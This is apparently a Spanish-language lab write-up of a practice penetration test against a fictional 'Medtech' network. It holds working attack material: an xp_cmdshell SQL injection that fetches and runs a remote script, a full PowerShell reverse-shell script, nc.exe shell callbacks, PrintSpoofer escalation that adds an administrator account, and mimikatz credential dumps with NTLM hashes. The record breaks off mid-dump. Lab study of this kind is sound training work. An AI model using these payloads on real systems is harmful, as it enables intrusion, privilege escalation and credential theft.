# Challenge: Medtech

## Fecha: 16/05/2025 - 29/05/2025
## Hosts: 
```
# DMZ
192.168.xxx.120
192.168.xxx.121
192.168.xxx.122
# Medtech
172.16.xxx.10
172.16.xxx.11
172.16.xxx.12
172.16.xxx.13
172.16.xxx.14
172.16.xxx.82
172.16.xxx.83
```
## Objetivo
We have been tasked to conduct a penetration test for MEDTECH a recently formed IoT healthcare startup. 
Our objective is to find as many vulnerabilities and misconfigurations as possible in order to increase 
their Active Directory security posture and reduce the attack surface.

The organization topology diagram is shown below and the public subnet network resides in the 192.168.xx.0/24 range, 
where the xx of the third octet can be found under the IP ADDRESS field in the control panel.

## Herramientas
1. nmap 
2. Burpsuite - PayloadAllTheThings
3. tcpdump
4. ligolo
5. ssh
6. impacket: [ smbclient, dumpsecrets ]
7. nc/nc.exe
8. evil-winrm

## Procedimiento y comandos
#### Paso 1: Reconocimiento y enumeracion de DMZ
- Con nmap generamos un escaneo agresivo -A sobre la DMZ
```
┌──(root㉿kali)-[/home/kali/OffSec/Challenges/1_Medtech]
└─# nmap -A 192.168.170.120-122     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-30 18:31 -03
Nmap scan report for 192.168.170.120
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 84:72:7e:4c:bb:ff:86:ae:b0:03:00:79:a1:c5:af:34 (RSA)
|   256 f1:31:e5:75:31:36:a2:59:f3:12:1b:58:b4:bb:dc:0f (ECDSA)
|_  256 5a:05:9c:fc:2f:7b:7e:0b:81:a6:20:48:5a:1d:82:7e (ED25519)
80/tcp open  http    WEBrick httpd 1.6.1 (Ruby 2.7.4 (2021-07-07))
|_http-server-header: WEBrick/1.6.1 (Ruby/2.7.4/2021-07-07)
|_http-title: PAW! (PWK Awesome Website)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   162.45 ms 192.168.45.1
2   162.41 ms 192.168.45.254
3   162.49 ms 192.168.251.1
4   162.56 ms 192.168.170.120

Nmap scan report for 192.168.170.121
Host is up (0.16s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: MedTech
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=5/30%OT=80%CT=1%CU=38460%PV=Y%DS=4%DC=T%G=Y%TM=683A23F
...etc

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-05-30T21:32:32
|_  start_date: N/A

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
-   Hops 1-3 are the same as for 192.168.170.120
4   162.54 ms 192.168.170.121

Nmap scan report for 192.168.170.122
Host is up (0.16s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 60:f9:e1:44:6a:40:bc:90:e0:3f:1d:d8:86:bc:a9:3d (ECDSA)
|_  256 24:97:84:f2:58:53:7b:a3:f7:40:e9:ad:3d:12:1e:c7 (ED25519)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
-   Hops 1-3 are the same as for 192.168.170.120
4   162.55 ms 192.168.170.122

```
#### - Host 1
🟢 192.168.170.120
Servicios detectados:

   - SSH: OpenSSH 8.4p1 Debian

   - HTTP: WEBrick 1.6.1 (Ruby 2.7.4)

       - Título: PAW! (PWK Awesome Website)

Observaciones relevantes:

    - WEBrick + Ruby es inusual en entornos productivos → podría ser vulnerable a exploits en aplicaciones Ruby o vulnerabilidades en WEBrick (por ejemplo, file disclosure o RCE).

    - Posible objetivo de ataques como:

        - LFI/RFI si hay rutas dinámicas.

        - Ruby deserialization si hay manejo de objetos serializados.

        - Brute-force por SSH.

   Sistema identificado como Linux o MikroTik RouterOS, lo cual es raro en conjunto. Podría ser un contenedor o un equipo embebido.

#### - Host 2
🔵 192.168.170.121
Servicios detectados:

   - HTTP: Microsoft IIS 10.0

        - Título: MedTech

        - Método TRACE habilitado → riesgo de XST (Cross Site Tracing)

   - RPC / SMB / WinRM (5985)

Observaciones relevantes:

    - Esta parece una máquina Windows en un entorno corporativo:

        - SMB abierto (puertos 139/445) → se puede intentar:

            - Enumerar recursos compartidos (smbclient, enum4linux, crackmapexec)

            - Validar credenciales con Pass-the-Hash

            - Ver si WinRM permite autenticación (Evil-WinRM)

        - WinRM (5985) habilitado → permite acceso remoto con credenciales válidas.

   No requiere firma SMB (Message signing enabled but not required) → posible vector para ataques como NTLM relay.

#### - Host 3:
🔴 192.168.170.122
Servicios detectados:

   - SSH: OpenSSH 8.9p1 Ubuntu 3

Observaciones relevantes:

   - Casi idéntica en fingerprint a la 120 → puede ser un sistema clonado o con la misma imagen base.

   No hay servicio web o SMB visible, pero el acceso por SSH podría ser útil si se encuentran credenciales.

---

| IP                | Prioridad | Razón                                                                    |
| ----------------- | --------- | ------------------------------------------------------------------------ |
| `192.168.170.121` | 🔥 Alta   | Windows con múltiples servicios expuestos, SMB sin firma, WinRM abierto. |
| `192.168.170.120` | 🟡 Media  | WEBrick + Ruby = potenciales bugs o deserialización.                     |
| `192.168.170.122` | 🟢 Baja   | Sólo SSH, parece similar a 120. Quizá útil más adelante.                 |


#### Paso 2: Exploramos 192.168.170.121 en el navegador.
- Encontramos el sitio de medtech y exploramos en busqueda de formularios de logins y rutas escondidas.
> Varios Doritos desupues >>>
Encontramos un formulario de login al hacer click en el boton "Make an Appointment", 
abrimos con burpusuite para explorar un poco mas en profundidad los servicios y revisar por posibles inyecciones.
Al tratarse de un host microsoft la alternativa con mas reelevancia a explorar es MSSQL. Para comprobar esto se puede ejecutar en una terminal 
tcpdump y ejecutar desde el repeater o el intruder el siguiente payload:
```
'; exec master..xp_cmdshell 'powershell -c "ping 192.168.45.239"'--
```
y escuchar en tcpdump el trafico al momento de ejecutar:
```
┌──(kali㉿kali)-[~/OffSec]
└─$ sudo tcpdump -i tun0 icmp     
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
16:49:20.823994 IP medtech.com > 192.168.45.239: ICMP echo request, id 256, seq 17, length 40
16:49:20.824027 IP 192.168.45.239 > medtech.com: ICMP echo reply, id 256, seq 17, length 40
16:49:21.848282 IP medtech.com > 192.168.45.239: ICMP echo request, id 256, seq 18, length 40
16:49:21.848314 IP 192.168.45.239 > medtech.com: ICMP echo reply, id 256, seq 18, length 40
16:49:22.872021 IP medtech.com > 192.168.45.239: ICMP echo request, id 256, seq 19, length 40
16:49:22.872053 IP 192.168.45.239 > medtech.com: ICMP echo reply, id 256, seq 19, length 40
16:49:23.896308 IP medtech.com > 192.168.45.239: ICMP echo request, id 256, seq 20, length 40
16:49:23.896340 IP 192.168.45.239 > medtech.com: ICMP echo reply, id 256, seq 20, length 40
16:49:27.889866 IP medtech.com > 192.168.45.239: ICMP echo request, id 256, seq 21, length 40
16:49:27.889898 IP 192.168.45.239 > medtech.com: ICMP echo reply, id 256, seq 21, length 40
16:49:28.913651 IP medtech.com > 192.168.45.239: ICMP echo request, id 256, seq 22, length 40
16:49:28.913684 IP 192.168.45.239 > medtech.com: ICMP echo reply, id 256, seq 22, length 40
16:49:29.903427 IP medtech.com > 192.168.45.239: ICMP echo request, id 256, seq 23, length 40
16:49:29.903459 IP 192.168.45.239 > medtech.com: ICMP echo reply, id 256, seq 23, length 40
16:49:30.961718 IP medtech.com > 192.168.45.239: ICMP echo request, id 256, seq 24, length 40
16:49:30.961749 IP 192.168.45.239 > medtech.com: ICMP echo reply, id 256, seq 24, length 40
^C
16 packets captured
16 packets received by filter
0 packets dropped by kernel
```
- Esto confirma la hipotesis de inyeccion como afirmativa. 
#### Paso 3: Explotacion del primer host .121

- Levantamos un listener **nc** y ejecutamos desde el intruder el siguiente payload:

```
'; exec master..xp_cmdshell 'powershell -c "iwr -uri http://192.168.45.239:8000/shell.ps1 -UseBasicParsing | iex"'--
'; exec master..xp_cmdshell "powershell -c \"iwr -uri http://192.168.45.239:8000/shell.ps1 -UseBasicParsing | iex\""--
```
> Importante! antes de ejecutar el payload en burp, debemos hacer dos cosas, generar un script que genere el reverse shell y servirlo con python
```
┌──(root㉿kali)-[/home/kali/OffSec/Challenges/1_Medtech]
└─# cat shell.ps1               
# shell.ps1
$client = New-Object System.Net.Sockets.TCPClient("192.168.45.239",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();
```
- Servimos con python:
```
┌──(kali㉿kali)-[~/OffSec/Challenges/1_Medtech]
└─$ python3 -m http.server 8000                                      
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.170.121 - - [30/May/2025 22:41:13] "GET /shell.ps1 HTTP/1.1" 200 -
```
- Obtenemos el primer acceso:
```bash
┌──(root㉿kali)-[/home/kali/OffSec/Challenges/1_Medtech]
└─# nc -nlvp 4444              
listening on [any] 4444 ...
connect to [192.168.45.239] from (UNKNOWN) [192.168.170.121] 56562
whoami
nt service\mssql$sqlexpress
PS C:\Windows\system32> 
```
#### Paso 4: Enumeracion de .121
- Enumeramos privilegios

```powershell
PS C:\Windows\system32> whoami /all

USER INFORMATION
----------------

User Name                   SID                                                            
=========================== ===============================================================
nt service\mssql$sqlexpress S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Performance Monitor Users    Alias            S-1-5-32-558 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT SERVICE\ALL SERVICES              Well-known group S-1-5-80-0   Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled # importante!
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
PS C:\Windows\system32>
```

En primera instancia encontramos un permiso que habilita un vector de ataque donde podemos obtener un token SYSTEM,
utilizaramos PrintSpoofer.exe para proceder por esta via.

#### Paso 5: Escalada de privilegios en .121

1. Imprtamos desde kali PrintSpoofer64.exe y creamos el usuario **pwned** con **Passw0rd!**

```powershell
PS C:\Tools> iwr -uri http://192.168.45.239:8000/PrintSpoofer64.exe -Outfile PrintSpoofer.exe
PS C:\Tools> dir


    Directory: C:\Tools


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         5/30/2025   7:11 PM          27136 PrintSpoofer.exe                                                     


PS C:\Tools> .\PrintSpoofer.exe -i -c "cmd /c net user pwned Passw0rd! /add && net localgroup administrators pwned /add && net localgroup 'Remote Management Users' pwned /add"                                   
[+] Found privilege: SeImpersonatePrivilege                                                                                                                                                                       
[+] Named pipe listening...                                                                                                                                                                                       
[+] CreateProcessAsUser() OK                                                                                                                                                                                      
The command completed successfully.

PS C:\Tools> net user pwned
User name                    pwned
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/30/2025 7:15:24 PM
Password expires             7/11/2025 7:15:24 PM
Password changeable          5/31/2025 7:15:24 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       *Users                
Global Group memberships     *None                 
The command completed successfully.
```
Dado que pudimos ejecutar esto sin restricciones podemos intentar crear un shell con privilegios SYSTEM
desde kali ejecutamos el listener:

```
┌──(root㉿kali)-[/home/kali/OffSec/Challenges/1_Medtech]
└─# nc -nlvp 1234             
listening on [any] 1234 ...
```
Desde la maquina comprometida podemos ahora usar PrintSpoofer para generar otra conexion con privilegios elevados:
1. Servimos y traemos nc.exe, luego ejecutamos el shell con el listener activo en nuestro kali

```powerview
PS C:\Tools> iwr -uri http://192.168.45.239:8000/nc.exe -Outfile nc.exe
PS C:\Tools> .\PrintSpoofer.exe -c "C:\Tools\nc.exe 192.168.45.239 1234 -e cmd"    
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
PS C:\Tools> 
```
kali:

```
┌──(root㉿kali)-[/home/kali/OffSec/Challenges/1_Medtech]
└─# nc -nlvp 1234             
listening on [any] 1234 ...
connect to [192.168.45.239] from (UNKNOWN) [192.168.170.121] 57113
Microsoft Windows [Version 10.0.20348.1006]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
whoami
nt authority\system
```
#### Paso 6: Buscamos credenciales que nos permitan pivotear a otro host.

1. Obtenemos en primer instancia los flags (proof)

```powershell
PS C:\Windows\system32> powershell -ep bypass
powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> Get-ChildItem C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         5/30/2025   2:26 PM             34 proof.txt                                                            

PS C:\Users> type Administrator\Desktop\proof.txt
type Administrator\Desktop\proof.txt
ba85bac13a36e67690a693dc388ae69f
```
2. buscamos credenciales y enumeramos usuarios

> importamos PowerView

```powershell
PS C:\Tools> iwr -uri http://192.168.45.239:8000/PowerView.ps1 -Outfile PowerView.ps1
iwr -uri http://192.168.45.239:8000/PowerView.ps1 -Outfile PowerView.ps1
PS C:\Tools> . .\PowerView.ps1
. .\PowerView.ps1
PS C:\Tools> Get-NetComputer | select operatingsystem,dnshostname
Get-NetComputer | select operatingsystem,dnshostname

operatingsystem              dnshostname          
---------------              -----------          
Windows Server 2022 Standard DC01.medtech.com     
Windows Server 2022 Standard FILES02.medtech.com  
Windows Server 2022 Standard DEV04.medtech.com    
Windows 11 Enterprise        CLIENT01.medtech.com 
Windows Server 2022 Standard PROD01.medtech.com   
Windows 11 Enterprise        CLIENT02.medtech.com 
Windows Server 2022 Standard WEB02.dmz.medtech.com

PS C:\Tools> Get-Domain
Get-Domain

Forest                  : medtech.com
DomainControllers       : {DC01.medtech.com}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : 
PdcRoleOwner            : DC01.medtech.com
RidRoleOwner            : DC01.medtech.com
InfrastructureRoleOwner : DC01.medtech.com
Name                    : medtech.com

PS C:\Tools> Get-DomainController
Get-DomainController


Forest                     : medtech.com
CurrentTime                : 5/31/2025 2:59:10 AM
HighestCommittedUsn        : 139625
OSVersion                  : Windows Server 2022 Standard
Roles                      : {SchemaRole, NamingRole, PdcRole, RidRole...}
Domain                     : medtech.com
IPAddress                  : 172.16.170.10
SiteName                   : Default-First-Site-Name
SyncFromAllServersCallback : 
InboundConnections         : {}
OutboundConnections        : {}
Name                       : DC01.medtech.com
Partitions                 : {DC=medtech,DC=com, CN=Configuration,DC=medtech,DC=com, 
                             CN=Schema,CN=Configuration,DC=medtech,DC=com, DC=DomainDnsZones,DC=medtech,DC=com...}

PS C:\Tools> Get-DomainUser | select samaccountname,description,pwdlastest,lastlogon
Get-DomainUser | select samaccountname,description,pwdlastest,lastlogon

samaccountname description                                              pwdlastest lastlogon            
-------------- -----------                                              ---------- ---------            
Administrator  Built-in account for administering the computer/domain              5/30/2025 2:26:02 PM 
Guest          Built-in account for guest access to the computer/domain            12/31/1600 4:00:00 PM
offsec         offsec                                                              12/31/1600 4:00:00 PM
krbtgt         Key Distribution Center Service Account                             12/31/1600 4:00:00 PM
leon                                                                               5/30/2025 4:11:14 PM 
joe                                                                                5/30/2025 2:27:20 PM 
peach                                                                              12/31/1600 4:00:00 PM
mario                                                                              12/31/1600 4:00:00 PM
wario                                                                              11/15/2022 1:43:35 AM
yoshi  

PS C:\Tools> Get-DomainGroup | select samaccountname,description
Get-DomainGroup | select samaccountname,description

samaccountname                          description                                                                    
--------------                          -----------                                                                    
Administrators                          Administrators have complete and unrestricted access to the computer/domain    
Users                                   Users are prevented from making accidental or intentional system-wide change...
Guests                                  Guests have the same access as members of the Users group by default, except...
Print Operators                         Members can administer printers installed on domain controllers                
Backup Operators                        Backup Operators can override security restrictions for the sole purpose of ...
Replicator                              Supports file replication in a domain                                          
Remote Desktop Users                    Members in this group are granted the right to logon remotely                  
Network Configuration Operators         Members in this group can have some administrative privileges to manage conf...
Performance Monitor Users               Members of this group can access performance counter data locally and remotely 
Performance Log Users                   Members of this group may schedule logging of performance counters, enable t...
Distributed COM Users                   Members are allowed to launch, activate and use Distributed COM objects on t...
IIS_IUSRS                               Built-in group used by Internet Information Services.                          
Cryptographic Operators                 Members are authorized to perform cryptographic operations.                    
Event Log Readers                       Members of this group can read event logs from local machine                   
Certificate Service DCOM Access         Members of this group are allowed to connect to Certification Authorities in...
RDS Remote Access Servers               Servers in this group enable users of RemoteApp programs and personal virtua...
RDS Endpoint Servers                    Servers in this group run virtual machines and host sessions where users Rem...
RDS Management Servers                  Servers in this group can perform routine administrative actions on servers ...
Hyper-V Administrators                  Members of this group have complete and unrestricted access to all features ...
Access Control Assistance Operators     Members of this group can remotely query authorization attributes and permis...
Remote Management Users                 Members of this group can access WMI resources over management protocols (su...
Storage Replica Administrators          Members of this group have complete and unrestricted access to all features ...
Domain Computers                        All workstations and servers joined to the domain                              
Domain Controllers                      All domain controllers in the domain                                           
Schema Admins                           Designated administrators of the schema                                        
Enterprise Admins                       Designated administrators of the enterprise                                    
Cert Publishers                         Members of this group are permitted to publish certificates to the directory   
Domain Admins                           Designated administrators of the domain                                        
Domain Users                            All domain users                                                               
Domain Guests                           All domain guests                                                              
Group Policy Creator Owners             Members in this group can modify group policy for the domain                   
RAS and IAS Servers                     Servers in this group can access remote access properties of users             
Server Operators                        Members can administer domain servers                                          
Account Operators                       Members can administer domain user and group accounts                          
Pre-Windows 2000 Compatible Access      A backward compatibility group which allows read access on all users and gro...
Incoming Forest Trust Builders          Members of this group can create incoming, one-way trusts to this forest       
Windows Authorization Access Group      Members of this group have access to the computed tokenGroupsGlobalAndUniver...
Terminal Server License Servers         Members of this group can update user accounts in Active Directory with info...
Allowed RODC Password Replication Group Members in this group can have their passwords replicated to all read-only d...
Denied RODC Password Replication Group  Members in this group cannot have their passwords replicated to any read-onl...
Read-only Domain Controllers            Members of this group are Read-Only Domain Controllers in the domain           
Enterprise Read-only Domain Controllers Members of this group are Read-Only Domain Controllers in the enterprise       
Cloneable Domain Controllers            Members of this group that are domain controllers may be cloned.               
Protected Users                         Members of this group are afforded additional protections against authentica...
Key Admins                              Members of this group can perform administrative actions on key objects with...
Enterprise Key Admins                   Members of this group can perform administrative actions on key objects with...
DnsAdmins                               DNS Administrators Group                                                       
DnsUpdateProxy                          DNS clients who are permitted to perform dynamic updates on behalf of some o...

PS C:\Tools> Get-DomainComputer | select name,operatingsystem,dnshostname
Get-DomainComputer | select name,operatingsystem,dnshostname

name     operatingsystem              dnshostname          
----     ---------------              -----------          
DC01     Windows Server 2022 Standard DC01.medtech.com     
FILES02  Windows Server 2022 Standard FILES02.medtech.com  
DEV04    Windows Server 2022 Standard DEV04.medtech.com    
CLIENT01 Windows 11 Enterprise        CLIENT01.medtech.com 
PROD01   Windows Server 2022 Standard PROD01.medtech.com   
CLIENT02 Windows 11 Enterprise        CLIENT02.medtech.com 
WEB02    Windows Server 2022 Standard WEB02.dmz.medtech.com

PS C:\Tools> Invoke-ShareFinder
Invoke-ShareFinder                                                                                                                   
                                                                                                                                     
Name           Type Remark              ComputerName                                                                                 
----           ---- ------              ------------                                                                                 
ADMIN$   2147483648 Remote Admin        DC01.medtech.com                                                                             
C$       2147483648 Default share       DC01.medtech.com                                                                             
IPC$     2147483651 Remote IPC          DC01.medtech.com                                                                             
NETLOGON          0 Logon server share  DC01.medtech.com                                                                             
SYSVOL            0 Logon server share  DC01.medtech.com                                                                             
ADMIN$   2147483648 Remote Admin        FILES02.medtech.com                                                                          
C                 0                     FILES02.medtech.com                                                                          
C$       2147483648 Default share       FILES02.medtech.com                                                                          
IPC$     2147483651 Remote IPC          FILES02.medtech.com                                                                          
TEMP              0                     FILES02.medtech.com                                                                          
ADMIN$   2147483648 Remote Admin        DEV04.medtech.com    
C$       2147483648 Default share       DEV04.medtech.com    
IPC$     2147483651 Remote IPC          DEV04.medtech.com    
ADMIN$   2147483648 Remote Admin        CLIENT01.medtech.com 
C$       2147483648 Default share       CLIENT01.medtech.com 
IPC$     2147483651 Remote IPC          CLIENT01.medtech.com 
ADMIN$   2147483648 Remote Admin        PROD01.medtech.com   
C$       2147483648 Default share       PROD01.medtech.com   
IPC$     2147483651 Remote IPC          PROD01.medtech.com   
ADMIN$   2147483648 Remote Admin        CLIENT02.medtech.com 
C                 0                     CLIENT02.medtech.com 
C$       2147483648 Default share       CLIENT02.medtech.com 
IPC$     2147483651 Remote IPC          CLIENT02.medtech.com 
Windows           0                     CLIENT02.medtech.com 
ADMIN$   2147483648 Remote Admin        WEB02.dmz.medtech.com
C$       2147483648 Default share       WEB02.dmz.medtech.com
IPC$     2147483651 Remote IPC          WEB02.dmz.medtech.com

```
- Con esto tenemos un panorama mas claro de la DMZ y la red interna MEDTECH.

| IP            | Hostname | OS                      | Puertos Abiertos | Observaciones                                                               |
| ------------- | -------- | ----------------------- | ---------------- | --------------------------------------------------------------------------- |
| 172.16.xxx.10 | DC01     | Windows Server 2022 Std | 445, 5985        | **Controlador de Dominio** - Alta prioridad para Kerberoasting/DCSync/PTH   |
| 172.16.xxx.11 | FILES02  | Windows Server 2022 Std | 445, 5985        | Potencial servidor de archivos – revisar SMB con `Invoke-ShareFinder`       |
| 172.16.xxx.12 | DEV04    | Windows Server 2022 Std | 445, 3389, 5985  | Tiene RDP – probablemente entorno de desarrollo (usuarios con acceso común) |
| 172.16.xxx.13 | PROD01   | Windows Server 2022 Std | 445, 5985        | Producción – revisar WinRM si tienes credenciales                           |
| 172.16.xxx.14 | ???      | Linux (OpenSSH 8.4)     | 22               | No resolvió DNS – probable sistema auxiliar (monitorización, backup, etc.)  |
| 172.16.xxx.82 | CLIENT01 | Windows 11 Enterprise   | 445, 3389        | Estación de trabajo – objetivo ideal para buscar credenciales en memoria    |
| 172.16.xxx.83 | CLIENT02 | Windows 11 Enterprise   | 445, 5985        | Estación de trabajo – revisar WinRM y sesiones activas                      |

- De aca queda buscar credenciales con mimikatz y tomar esta maquina momentaneamente como punto de pivote hacia la red interna MEDTECH

3. Importamos mimikatz y buscamos credenciales.

```
PS C:\Tools> .\mimikatz.exe
.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::msv

Authentication Id : 0 ; 672210 (00000000:000a41d2)
Session           : Service from 0
User Name         : MSSQL$MICROSOFT##WID
Domain            : NT SERVICE
Logon Server      : (null)
Logon Time        : 7/23/2024 10:43:58 PM
SID               : S-1-5-80-1184457765-4068085190-3456807688-2200952327-3769537534
        msv :
         [00000003] Primary
         * Username : WEB02$
         * Domain   : MEDTECH
         * NTLM     : acabf6bcd41c5143c8d1d034b22042b5
         * SHA1     : fa5dfbeba2bdf793d8490b033a56396db5b4db70

Authentication Id : 0 ; 342158 (00000000:0005388e)
Session           : Interactive from 1
User Name         : joe
Domain            : MEDTECH
Logon Server      : DC01
Logon Time        : 7/23/2024 10:42:00 PM
SID               : S-1-5-21-976142013-3766213998-138799841-1106
        msv :
         [00000003] Primary
         * Username : joe
         * Domain   : MEDTECH
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : 58de53296298ce0f98087ae902c88735

Authentication Id : 0 ; 291706 (00000000:0004737a)
Session           : Service from 0
User Name         : joe
Domain            : MEDTECH
Logon Server      : DC01
Logon Time        : 7/23/2024 10:41:56 PM
SID               : S-1-5-21-976142013-3766213998-138799841-1106
        msv :
         [00000003] Primary
         * Username : joe
         * Domain   : MEDTECH
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : 58de53296298ce0f98087ae902c88735

Authentication Id : 0 ; 291702 (00000000:00047376)
Session           : Service from 0
User Name         : joe
Domain            : MEDTECH
Logon Server      : DC01
Logon Time        : 7/23/2024 10:41:56 PM
SID               : S-1-5-21-976142013-3766213998-138799841-1106
        msv :
         [00000003] Primary
         * Username : joe
         * Domain   : MEDTECH
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : 58de53296298ce0f98087ae902c88735

Authentication Id : 0 ; 120992 (00000000:0001d8a0)
Session           : Service from 0
User Name         : MSSQL$SQLEXPRESS
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 7/23/2024 10:41:44 PM
SID               : S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133
        msv :
         [00000003] Primary
         * Username : WEB02$
         * Domain   : MEDTECH
         * NTLM     : acabf6bcd41c5143c8d1d034b22042b5
         * SHA1     : fa5dfbeba2bdf793d8490b033a56396db5b4db70

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WEB02$
Domain            : MEDTECH
Logon Server      : (null)
Logon Time        : 7/23/2024 10:41:43 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : WEB02$
         * Domain   : MEDTECH
         * NTLM     : acabf6bcd41c5143c8d1d034b22042b5
         * SHA1     : fa5dfbeba2bdf793d8490b033a56396db5b4db70

Authentication Id : 0 ; 47729 (00000000:0000ba71)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 7/23/2024 10:41:43 PM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : WEB02$
         * Domain   : MEDTECH
         * NTLM     : acabf6bcd41c5143c8d1d034b22042b5
         * SHA1     : fa5dfbeba2bdf793d8490b033a56396db5b4db70

Authentication Id : 0 ; 1979066 (00000000:001e32ba)
Session           : Service from 0
User Name         : DefaultAppPool
Domain            : IIS APPPOOL
Logon Server      : (null)
